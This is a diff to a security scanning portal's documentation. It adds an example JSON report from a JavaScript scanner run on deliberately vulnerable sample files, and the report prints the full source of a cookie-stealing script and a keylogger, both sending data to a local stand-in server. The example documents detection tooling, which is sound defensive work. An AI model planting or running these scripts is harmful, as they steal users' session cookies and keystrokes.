@@ -36,7 +36,49 @@ In this command, the following parameters are used:
 Asset information, if an [auditor ](broken-reference)is used
 
 9. `-F "repository=<repository SSH URL>"`: If your product is **code** in a repository enter the address of your **repository** in a specific format, for example: git@gitlab.com:whitespots-public/appsec-portal.git
-10. &#x20;\-F "docker\_image=\<registry address>": If your product is **image** enter the address of the **registry** where your product is located, for example: registry.gitlab.com/whitespots-public/appsec-portal/back/auto\_validator:latest
-11. \-F "domain=\<domain>": If your product is **web** enter the **domain name** of your product, for example: whitespots.io
-12. \-F "host=\<host>": If your product is **web** enter the **IP address** of your product, for example: 0.0.0.0
+10. &#x20;`-F "docker_image=<registry address>"`: If your product is **image** enter the address of the **registry** where your product is located, for example: registry.gitlab.com/whitespots-public/appsec-portal/back/auto\_validator:latest
+11. `-F "domain=<domain>"`: If your product is **web** enter the **domain name** of your product, for example: whitespots.io
+12. `-F "host=<host>"`: If your product is **web** enter the **IP address** of your product, for example: 0.0.0.0
 
+**Report example:**
+
+```json
+[{"filePath":"/builds/whitespots-public/vulnerable-apps/python-public-example/bad/payloads/cookie.js",
+"messages":[{"ruleId":"scanjs-rules/assign_to_src",
+"severity":1,"message":"Assignment to src can be unsafe",
+"line":1,"column":1,"nodeType":"AssignmentExpression",
+"endLine":1,"endColumn":68}],"suppressedMessages":[],
+"errorCount":0,"fatalErrorCount":0,"warningCount":1,
+"fixableErrorCount":0,"fixableWarningCount":0,"source":
+"new Image().src = 'http://127.0.0.1:8000/cookie?c='+document.cookie;\n",
+"usedDeprecatedRules":[]},
+{"filePath":"/builds/whitespots-public/vulnerable-apps/python-public-example/bad/payloads/keylogger.js",
+"messages":[{"ruleId":"scanjs-rules/call_setInterval","severity":1,
+"message":"The function setInterval can be unsafe","line":10,"column":1,
+"nodeType":"CallExpression","endLine":14,"endColumn":9},
+{"ruleId":"scanjs-rules/assign_to_src","severity":1,
+"message":"Assignment to src can be unsafe","line":12,"column":3,
+"nodeType":"AssignmentExpression","endLine":12,"endColumn":57}],
+"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":2,
+"fixableErrorCount":0,"fixableWarningCount":0,
+"source":"console.log(\"ACTIVANDO EL KEYLOGGER...\");\nvar keys='';\ndocument.onkeypress = function(e) {\n  get = window.event?event:e;\n  key = get.keyCode?get.keyCode:get.charCode;\n  key = String.fromCharCode(key);\n  keys+=key;\n}\n\nsetInterval(function(){\n  console.log(\"Loop\");\n  new Image().src = 'http://127.0.0.1:8000/keys?c='+keys;\n  keys = '';\n}, 8000);\n",
+"usedDeprecatedRules":[]},
+{"filePath":"/builds/whitespots-public/vulnerable-apps/python-public-example/bad/payloads/payload.js",
+"messages":[{"ruleId":"scanjs-rules/call_setInterval","severity":1,
+"message":"The function setInterval can be unsafe","line":10,"column":1,
+"nodeType":"CallExpression","endLine":14,"endColumn":9},
+{"ruleId":"scanjs-rules/assign_to_src","severity":1,
+"message":"Assignment to src can be unsafe","line":12,"column":3,
+"nodeType":"AssignmentExpression","endLine":12,"endColumn":57}],
+"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":2,
+"fixableErrorCount":0,"fixableWarningCount":0,
+"source":"console.log(\"ACTIVANDO EL KEYLOGGER...\");\nvar keys='';\ndocument.onkeypress = function(e) {\n  get = window.event?event:e;\n  key = get.keyCode?get.keyCode:get.charCode;\n  key = String.fromCharCode(key);\n  keys+=key;\n}\n\nsetInterval(function(){\n  console.log(\"Loop\");\n  new Image().src = 'http://127.0.0.1:8000/keys?c='+keys;\n  keys = '';\n}, 8000);\n",
+"usedDeprecatedRules":[]},
+{"filePath":"/builds/whitespots-public/vulnerable-apps/python-public-example/good/payloads/cookie.js",
+"messages":[{"ruleId":"scanjs-rules/assign_to_src","severity":1,
+"message":"Assignment to src can be unsafe","line":1,"column":1,
+"nodeType":"AssignmentExpression","endLine":1,"endColumn":68}],
+"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":1,"
+fixableErrorCount":0,"fixableWarningCount":0,
+"source":"new Image().src = 'http://127.0.0.1:8000/cookie?c='+document.cookie;\n","usedDeprecatedRules":[]},{"filePath":"/builds/whitespots-public/vulnerable-apps/python-public-example/good/payloads/keylogger.js","messages":[{"ruleId":"scanjs-rules/call_setInterval","severity":1,"message":"The function setInterval can be unsafe","line":10,"column":1,"nodeType":"CallExpression","endLine":14,"endColumn":9},{"ruleId":"scanjs-rules/assign_to_src","severity":1,"message":"Assignment to src can be unsafe","line":12,"column":3,"nodeType":"AssignmentExpression","endLine":12,"endColumn":57}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":2,"fixableErrorCount":0,"fixableWarningCount":0,"source":"console.log(\"ACTIVANDO EL KEYLOGGER...\");\nvar keys='';\ndocument.onkeypress = function(e) {\n  get = window.event?event:e;\n  key = get.keyCode?get.keyCode:get.charCode;\n  key = String.fromCharCode(key);\n  keys+=key;\n}\n\nsetInterval(function(){\n  console.log(\"Loop\");\n  new Image().src = 'http://127.0.0.1:8000/keys?c='+keys;\n  keys = '';\n}, 8000);\n","usedDeprecatedRules":[]},{"filePath":"/builds/whitespots-public/vulnerable-apps/python-public-example/good/payloads/payload.js","messages":[{"ruleId":"scanjs-rules/call_setInterval","severity":1,"message":"The function setInterval can be unsafe","line":10,"column":1,"nodeType":"CallExpression","endLine":14,"endColumn":9},{"ruleId":"scanjs-rules/assign_to_src","severity":1,"message":"Assignment to src can be unsafe","line":12,"column":3,"nodeType":"AssignmentExpression","endLine":12,"endColumn":57}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":2,"fixableErrorCount":0,"fixableWarningCount":0,"source":"console.log(\"ACTIVANDO EL KEYLOGGER...\");\nvar keys='';\ndocument.onkeypress = function(e) {\n  get = window.event?event:e;\n  key = get.keyCode?get.keyCode:get.charCode;\n  key = String.fromCharCode(key);\n  keys+=key;\n}\n\nsetInterval(function(){\n  console.log(\"Loop\");\n  new Image().src = 'http://127.0.0.1:8000/keys?c='+keys;\n  keys = '';\n}, 8000);\n","usedDeprecatedRules":[]}]
+```
